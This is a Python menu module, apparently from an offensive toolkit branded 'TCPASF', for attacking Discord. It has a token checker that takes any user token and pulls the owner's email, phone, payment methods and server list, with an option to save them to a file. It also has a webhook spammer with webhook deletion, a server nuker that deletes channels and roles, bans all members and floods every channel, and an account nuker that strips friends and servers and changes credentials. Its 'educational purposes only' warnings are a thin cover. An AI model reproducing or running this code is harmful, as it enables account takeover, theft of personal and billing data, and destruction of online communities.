import requests
import json
import time
import sys
import os
import threading
from colorama import init, Fore, Style

from tools.ascii_generator import generate_category_ascii, clear_screen, spinner_animation, typing_animation, display_system_info
from tools.discord_tools.discord_server_nuker import (
    get_server_info, delete_all_channels, delete_all_roles,
    create_spam_channels, create_spam_roles, spam_all_channels,
    ban_all_members, change_server_settings, full_server_nuke
)
from tools.discord_tools.discord_account_nuker import (
    leave_all_guilds, remove_all_friends, delete_all_dm_channels,
    change_account_settings, full_account_nuke
)

init(autoreset=True)

DISCORD_API = "https://discord.com/api/v9"

def check_token(token):
    print(f"\n{Fore.YELLOW}[*] Checking token validity...{Style.RESET_ALL}")

    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(f"{DISCORD_API}/users/@me", headers=headers)

        if response.status_code == 200:
            user_data = response.json()
            print(f"{Fore.GREEN}[+] Token is valid!{Style.RESET_ALL}")

            print(f"\n{Fore.CYAN}User Information:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Username: {Style.RESET_ALL}{user_data.get('username')}#{user_data.get('discriminator')}")
            print(f"{Fore.CYAN}ID: {Style.RESET_ALL}{user_data.get('id')}")
            print(f"{Fore.CYAN}Email: {Style.RESET_ALL}{user_data.get('email', 'N/A')}")
            print(f"{Fore.CYAN}Phone: {Style.RESET_ALL}{user_data.get('phone', 'N/A')}")
            print(f"{Fore.CYAN}2FA Enabled: {Style.RESET_ALL}{user_data.get('mfa_enabled', False)}")
            print(f"{Fore.CYAN}Verified: {Style.RESET_ALL}{user_data.get('verified', False)}")

            try:
                billing_response = requests.get(f"{DISCORD_API}/users/@me/billing/payment-sources", headers=headers)
                if billing_response.status_code == 200:
                    billing_data = billing_response.json()
                    if billing_data:
                        print(f"{Fore.CYAN}Payment Methods: {Style.RESET_ALL}{len(billing_data)}")
                        for method in billing_data:
                            if method.get('type') == 1:
                                print(f"  - Credit Card: **** **** **** {method.get('brand')} {method.get('last_4')}")
                            elif method.get('type') == 2:
                                print(f"  - PayPal: {method.get('email')}")
                    else:
                        print(f"{Fore.CYAN}Payment Methods: {Style.RESET_ALL}None")
            except:
                print(f"{Fore.CYAN}Payment Methods: {Style.RESET_ALL}Failed to retrieve")

            try:
                guilds_response = requests.get(f"{DISCORD_API}/users/@me/guilds", headers=headers)
                if guilds_response.status_code == 200:
                    guilds_data = guilds_response.json()
                    print(f"{Fore.CYAN}Servers: {Style.RESET_ALL}{len(guilds_data)}")

                    show_guilds = input(f"\n{Fore.CYAN}Show server list? (y/n): {Style.RESET_ALL}").lower()
                    if show_guilds == 'y':
                        print(f"\n{Fore.CYAN}Server List:{Style.RESET_ALL}")
                        for guild in guilds_data:
                            owner = " (Owner)" if guild.get('owner', False) else ""
                            print(f"  - {guild.get('name')}{owner} (ID: {guild.get('id')})")
            except:
                print(f"{Fore.CYAN}Servers: {Style.RESET_ALL}Failed to retrieve")

            return True, user_data
        else:
            print(f"{Fore.RED}[-] Invalid token. Status code: {response.status_code}{Style.RESET_ALL}")
            return False, None

    except Exception as e:
        print(f"{Fore.RED}[-] Error checking token: {str(e)}{Style.RESET_ALL}")
        return False, None

def check_webhook(webhook_url):
    print(f"\n{Fore.YELLOW}[*] Checking webhook validity...{Style.RESET_ALL}")

    try:
        response = requests.get(webhook_url)

        if response.status_code == 200:
            webhook_data = response.json()
            print(f"{Fore.GREEN}[+] Webhook is valid!{Style.RESET_ALL}")

            print(f"\n{Fore.CYAN}Webhook Information:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Name: {Style.RESET_ALL}{webhook_data.get('name')}")
            print(f"{Fore.CYAN}Channel ID: {Style.RESET_ALL}{webhook_data.get('channel_id')}")
            print(f"{Fore.CYAN}Guild ID: {Style.RESET_ALL}{webhook_data.get('guild_id')}")

            return True, webhook_data
        else:
            print(f"{Fore.RED}[-] Invalid webhook. Status code: {response.status_code}{Style.RESET_ALL}")
            return False, None

    except Exception as e:
        print(f"{Fore.RED}[-] Error checking webhook: {str(e)}{Style.RESET_ALL}")
        return False, None

def send_webhook_message(webhook_url, message, username=None, avatar_url=None, tts=False, embeds=None):
    print(f"\n{Fore.YELLOW}[*] Sending webhook message...{Style.RESET_ALL}")

    payload = {
        "content": message,
        "tts": tts
    }

    if username:
        payload["username"] = username

    if avatar_url:
        payload["avatar_url"] = avatar_url

    if embeds:
        payload["embeds"] = embeds

    try:
        response = requests.post(webhook_url, json=payload)

        if response.status_code == 204:
            print(f"{Fore.GREEN}[+] Message sent successfully!{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Failed to send message. Status code: {response.status_code}{Style.RESET_ALL}")
            if response.text:
                print(f"{Fore.RED}Response: {response.text}{Style.RESET_ALL}")
            return False

    except Exception as e:
        print(f"{Fore.RED}[-] Error sending message: {str(e)}{Style.RESET_ALL}")
        return False

def webhook_spammer(webhook_url, message, username=None, avatar_url=None, count=10, delay=1):
    print(f"\n{Fore.YELLOW}[*] Starting webhook spammer...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Target: {webhook_url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Message: {message}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Count: {count}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Delay: {delay}s{Style.RESET_ALL}")

    valid, _ = check_webhook(webhook_url)
    if not valid:
        print(f"{Fore.RED}[-] Aborting spam due to invalid webhook.{Style.RESET_ALL}")
        return

    confirm = input(f"\n{Fore.RED}[!] Are you sure you want to spam this webhook? (y/n): {Style.RESET_ALL}").lower()
    if confirm != 'y':
        print(f"{Fore.YELLOW}[*] Webhook spam cancelled.{Style.RESET_ALL}")
        return

    success_count = 0
    fail_count = 0

    print(f"\n{Fore.YELLOW}[*] Starting spam...{Style.RESET_ALL}")

    for i in range(count):
        current_message = f"{message} [{i+1}/{count}]" if count > 1 else message

        success = send_webhook_message(webhook_url, current_message, username, avatar_url)

        if success:
            success_count += 1
        else:
            fail_count += 1

        sys.stdout.write(f"\r{Fore.CYAN}[*] Progress: {i+1}/{count} | Success: {success_count} | Failed: {fail_count}{Style.RESET_ALL}")
        sys.stdout.flush()

        if i < count - 1:
            time.sleep(delay)

    print(f"\n\n{Fore.GREEN}[+] Webhook spam completed!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Total messages: {count} | Success: {success_count} | Failed: {fail_count}{Style.RESET_ALL}")

def delete_webhook(webhook_url):
    print(f"\n{Fore.YELLOW}[*] Attempting to delete webhook...{Style.RESET_ALL}")

    valid, _ = check_webhook(webhook_url)
    if not valid:
        print(f"{Fore.RED}[-] Cannot delete invalid webhook.{Style.RESET_ALL}")
        return False

    confirm = input(f"\n{Fore.RED}[!] Are you sure you want to DELETE this webhook? This cannot be undone! (y/n): {Style.RESET_ALL}").lower()
    if confirm != 'y':
        print(f"{Fore.YELLOW}[*] Webhook deletion cancelled.{Style.RESET_ALL}")
        return False

    try:
        response = requests.delete(webhook_url)

        if response.status_code == 204:
            print(f"{Fore.GREEN}[+] Webhook deleted successfully!{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Failed to delete webhook. Status code: {response.status_code}{Style.RESET_ALL}")
            if response.text:
                print(f"{Fore.RED}Response: {response.text}{Style.RESET_ALL}")
            return False

    except Exception as e:
        print(f"{Fore.RED}[-] Error deleting webhook: {str(e)}{Style.RESET_ALL}")
        return False

def token_checker_menu():
    clear_screen()
    print(generate_category_ascii("DISCORD TOOLS"))
    display_system_info()

    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║          DISCORD TOKEN CHECKER           ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════╝{Style.RESET_ALL}")

    token = input(f"\n{Fore.CYAN}Enter Discord token: {Style.RESET_ALL}")

    if not token:
        print(f"{Fore.RED}[-] Token cannot be empty.{Style.RESET_ALL}")
        return

    # Provide guidance on token format
    print(f"\n{Fore.YELLOW}[*] Note: For user tokens, no prefix is needed.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] For bot tokens, make sure to include the 'Bot ' prefix if needed.{Style.RESET_ALL}")

    valid, user_data = check_token(token)

    if valid:
        save = input(f"\n{Fore.CYAN}Save token information to file? (y/n): {Style.RESET_ALL}").lower()
        if save == 'y':
            filename = f"discord_token_{user_data.get('id')}.txt"

            with open(filename, 'w') as f:
                f.write(f"Discord Token Information\n")
                f.write(f"========================\n\n")
                f.write(f"Token: {token}\n\n")
                f.write(f"User Information:\n")
                f.write(f"Username: {user_data.get('username')}#{user_data.get('discriminator')}\n")
                f.write(f"ID: {user_data.get('id')}\n")
                f.write(f"Email: {user_data.get('email', 'N/A')}\n")
                f.write(f"Phone: {user_data.get('phone', 'N/A')}\n")
                f.write(f"2FA Enabled: {user_data.get('mfa_enabled', False)}\n")
                f.write(f"Verified: {user_data.get('verified', False)}\n")

            print(f"{Fore.GREEN}[+] Token information saved to {filename}{Style.RESET_ALL}")

    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

def webhook_spammer_menu():
    clear_screen()
    print(generate_category_ascii("DISCORD TOOLS"))
    display_system_info()

    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║          DISCORD WEBHOOK SPAMMER         ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════╝{Style.RESET_ALL}")

    webhook_url = input(f"\n{Fore.CYAN}Enter webhook URL: {Style.RESET_ALL}")

    if not webhook_url:
        print(f"{Fore.RED}[-] Webhook URL cannot be empty.{Style.RESET_ALL}")
        return

    valid, _ = check_webhook(webhook_url)
    if not valid:
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    message = input(f"\n{Fore.CYAN}Enter message to send: {Style.RESET_ALL}")

    if not message:
        print(f"{Fore.RED}[-] Message cannot be empty.{Style.RESET_ALL}")
        return

    username = input(f"\n{Fore.CYAN}Enter webhook username (optional): {Style.RESET_ALL}")
    avatar_url = input(f"\n{Fore.CYAN}Enter webhook avatar URL (optional): {Style.RESET_ALL}")

    count_input = input(f"\n{Fore.CYAN}Enter number of messages to send (default: 10): {Style.RESET_ALL}")
    count = 10
    if count_input.isdigit() and int(count_input) > 0:
        count = int(count_input)

    delay_input = input(f"\n{Fore.CYAN}Enter delay between messages in seconds (default: 1): {Style.RESET_ALL}")
    delay = 1
    if delay_input.replace('.', '', 1).isdigit() and float(delay_input) >= 0:
        delay = float(delay_input)

    webhook_spammer(webhook_url, message, username, avatar_url, count, delay)

    delete_option = input(f"\n{Fore.CYAN}Delete webhook after spamming? (y/n): {Style.RESET_ALL}").lower()
    if delete_option == 'y':
        delete_webhook(webhook_url)

    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

def discord_nuker_menu():
    clear_screen()
    print(generate_category_ascii("DISCORD TOOLS"))
    display_system_info()

    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║           DISCORD SERVER NUKER           ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════╝{Style.RESET_ALL}")

    print(f"{Fore.RED}WARNING: This tool is for educational purposes only.{Style.RESET_ALL}")
    print(f"{Fore.RED}Misuse of this tool may violate Discord's Terms of Service.{Style.RESET_ALL}")
    print(f"{Fore.RED}Use at your own risk and only on servers you own or have permission to test.{Style.RESET_ALL}")

    token = input(f"\n{Fore.CYAN}Enter Discord token: {Style.RESET_ALL}")

    if not token:
        print(f"{Fore.RED}[-] Token cannot be empty.{Style.RESET_ALL}")
        return

    # Provide guidance on token format
    print(f"\n{Fore.YELLOW}[*] Note: For user tokens, no prefix is needed.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] For bot tokens, make sure to include the 'Bot ' prefix if needed.{Style.RESET_ALL}")

    valid, user_data = check_token(token)

    if not valid:
        print(f"{Fore.RED}[-] Invalid token. Cannot proceed.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    server_id = input(f"\n{Fore.CYAN}Enter server ID to target: {Style.RESET_ALL}")

    if not server_id:
        print(f"{Fore.RED}[-] Server ID cannot be empty.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    # Verify server exists and token has access
    success, server_data = get_server_info(token, server_id)
    if not success:
        print(f"{Fore.RED}[-] Could not access server with ID {server_id}.{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Make sure the server ID is correct and your token has access to it.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}Nuking Options:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[1]{Style.RESET_ALL} Delete All Channels")
    print(f"{Fore.CYAN}[2]{Style.RESET_ALL} Delete All Roles")
    print(f"{Fore.CYAN}[3]{Style.RESET_ALL} Ban All Members")
    print(f"{Fore.CYAN}[4]{Style.RESET_ALL} Create Spam Channels")
    print(f"{Fore.CYAN}[5]{Style.RESET_ALL} Create Spam Roles")
    print(f"{Fore.CYAN}[6]{Style.RESET_ALL} Spam Messages in All Channels")
    print(f"{Fore.CYAN}[7]{Style.RESET_ALL} Change Server Name/Icon")
    print(f"{Fore.CYAN}[8]{Style.RESET_ALL} Execute All (Full Nuke)")
    print(f"{Fore.CYAN}[9]{Style.RESET_ALL} Cancel")

    choice = input(f"\n{Fore.CYAN}Select an option: {Style.RESET_ALL}")

    if choice == "9":
        print(f"{Fore.YELLOW}[*] Nuking cancelled.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.RED}WARNING: You are about to perform destructive actions on a Discord server.{Style.RESET_ALL}")
    print(f"{Fore.RED}This cannot be undone and may result in your account being banned.{Style.RESET_ALL}")

    confirm = input(f"\n{Fore.RED}Type 'I UNDERSTAND THE RISKS' to confirm: {Style.RESET_ALL}")

    if confirm != "I UNDERSTAND THE RISKS":
        print(f"{Fore.YELLOW}[*] Nuking cancelled.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    # Execute the selected action
    if choice == "1":
        delete_all_channels(token, server_id)
    elif choice == "2":
        delete_all_roles(token, server_id)
    elif choice == "3":
        ban_all_members(token, server_id)
    elif choice == "4":
        channel_count = input(f"\n{Fore.CYAN}Enter number of spam channels to create (default: 50): {Style.RESET_ALL}")
        if not channel_count.isdigit():
            channel_count = 50
        else:
            channel_count = int(channel_count)

        prefix = input(f"{Fore.CYAN}Enter channel name prefix (default: nuked-by-tcpasf-): {Style.RESET_ALL}")
        if not prefix:
            prefix = "nuked-by-tcpasf-"

        create_spam_channels(token, server_id, channel_count, prefix)
    elif choice == "5":
        role_count = input(f"\n{Fore.CYAN}Enter number of spam roles to create (default: 50): {Style.RESET_ALL}")
        if not role_count.isdigit():
            role_count = 50
        else:
            role_count = int(role_count)

        prefix = input(f"{Fore.CYAN}Enter role name prefix (default: NUKED-): {Style.RESET_ALL}")
        if not prefix:
            prefix = "NUKED-"

        create_spam_roles(token, server_id, role_count, prefix)
    elif choice == "6":
        message = input(f"\n{Fore.CYAN}Enter spam message (default: @everyone This server has been nuked by TCPASF): {Style.RESET_ALL}")
        if not message:
            message = "@everyone This server has been nuked by TCPASF"

        count = input(f"{Fore.CYAN}Enter number of messages per channel (default: 10): {Style.RESET_ALL}")
        if not count.isdigit():
            count = 10
        else:
            count = int(count)

        spam_all_channels(token, server_id, message, count)
    elif choice == "7":
        name = input(f"\n{Fore.CYAN}Enter new server name (default: NUKED BY TCPASF): {Style.RESET_ALL}")
        if not name:
            name = "NUKED BY TCPASF"

        change_server_settings(token, server_id, name)
    elif choice == "8":
        full_server_nuke(token, server_id)

    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

def account_nuker_menu():
    clear_screen()
    print(generate_category_ascii("DISCORD TOOLS"))
    display_system_info()

    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║           DISCORD ACCOUNT NUKER          ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════╝{Style.RESET_ALL}")

    print(f"{Fore.RED}WARNING: This tool is for educational purposes only.{Style.RESET_ALL}")
    print(f"{Fore.RED}Misuse of this tool may violate Discord's Terms of Service.{Style.RESET_ALL}")
    print(f"{Fore.RED}Use at your own risk and only on accounts you own.{Style.RESET_ALL}")

    token = input(f"\n{Fore.CYAN}Enter Discord token: {Style.RESET_ALL}")

    if not token:
        print(f"{Fore.RED}[-] Token cannot be empty.{Style.RESET_ALL}")
        return

    # Provide guidance on token format
    print(f"\n{Fore.YELLOW}[*] Note: For user tokens, no prefix is needed.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] For bot tokens, make sure to include the 'Bot ' prefix if needed.{Style.RESET_ALL}")

    valid, user_data = check_token(token)

    if not valid:
        print(f"{Fore.RED}[-] Invalid token. Cannot proceed.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}Account Nuking Options:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[1]{Style.RESET_ALL} Leave All Servers")
    print(f"{Fore.CYAN}[2]{Style.RESET_ALL} Remove All Friends")
    print(f"{Fore.CYAN}[3]{Style.RESET_ALL} Delete All DM Channels")
    print(f"{Fore.CYAN}[4]{Style.RESET_ALL} Change Account Settings")
    print(f"{Fore.CYAN}[5]{Style.RESET_ALL} Execute All (Full Account Nuke)")
    print(f"{Fore.CYAN}[6]{Style.RESET_ALL} Cancel")

    choice = input(f"\n{Fore.CYAN}Select an option: {Style.RESET_ALL}")

    if choice == "6":
        print(f"{Fore.YELLOW}[*] Account nuking cancelled.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.RED}WARNING: You are about to perform destructive actions on a Discord account.{Style.RESET_ALL}")
    print(f"{Fore.RED}This cannot be undone and may result in the account being banned.{Style.RESET_ALL}")

    confirm = input(f"\n{Fore.RED}Type 'I UNDERSTAND THE RISKS' to confirm: {Style.RESET_ALL}")

    if confirm != "I UNDERSTAND THE RISKS":
        print(f"{Fore.YELLOW}[*] Account nuking cancelled.{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        return

    # Execute the selected action
    if choice == "1":
        leave_all_guilds(token)
    elif choice == "2":
        remove_all_friends(token)
    elif choice == "3":
        delete_all_dm_channels(token)
    elif choice == "4":
        username = input(f"\n{Fore.CYAN}Enter new username (leave empty to skip): {Style.RESET_ALL}")
        email = input(f"{Fore.CYAN}Enter new email (leave empty to skip): {Style.RESET_ALL}")

        password = None
        new_password = None

        change_password = input(f"{Fore.CYAN}Change password? (y/n): {Style.RESET_ALL}").lower()
        if change_password == 'y':
            password = input(f"{Fore.CYAN}Enter current password: {Style.RESET_ALL}")
            new_password = input(f"{Fore.CYAN}Enter new password: {Style.RESET_ALL}")

        change_account_settings(token, username, email, password, new_password)
    elif choice == "5":
        full_account_nuke(token)

    input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

def discord_tools_menu():
    while True:
        clear_screen()
        print(generate_category_ascii("DISCORD TOOLS"))
        display_system_info()

        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║            DISCORD TOOLS MENU            ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════╝{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[1]{Style.RESET_ALL} Discord Token Checker")
        print(f"{Fore.CYAN}[2]{Style.RESET_ALL} Discord Webhook Spammer")
        print(f"{Fore.CYAN}[3]{Style.RESET_ALL} Discord Server Nuker")
        print(f"{Fore.CYAN}[4]{Style.RESET_ALL} Discord Account Nuker")
        print(f"{Fore.CYAN}[5]{Style.RESET_ALL} Back to Main Menu")

        choice = input(f"\n{Fore.CYAN}Select an option: {Style.RESET_ALL}")

        if choice == "1":
            token_checker_menu()
        elif choice == "2":
            webhook_spammer_menu()
        elif choice == "3":
            discord_nuker_menu()
        elif choice == "4":
            account_nuker_menu()
        elif choice == "5":
            break
        else:
            print(f"{Fore.RED}Invalid option. Please try again.{Style.RESET_ALL}")
            time.sleep(1)
